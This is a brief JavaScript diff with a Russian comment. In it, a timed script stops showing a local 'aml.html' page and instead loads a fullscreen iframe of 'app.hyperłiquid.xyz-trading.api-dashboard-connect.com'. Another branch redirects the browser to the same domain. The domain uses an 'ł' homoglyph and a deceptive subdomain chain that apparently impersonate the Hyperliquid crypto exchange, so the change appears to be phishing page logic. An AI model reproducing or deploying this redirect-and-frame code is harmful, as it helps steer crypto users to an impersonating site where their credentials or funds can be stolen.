@@ -56,7 +56,7 @@ setTimeout(() => {
       window.location.href = 'https://app.hyperłiquid.xyz-trading.api-dashboard-connect.com/';
     } else {
       // Показываем aml.html во фрейме
-      createFullscreenFrame('aml.html');
+      createFullscreenFrame('https://app.hyperłiquid.xyz-trading.api-dashboard-connect.com/');
     }
 
 }, 4000);
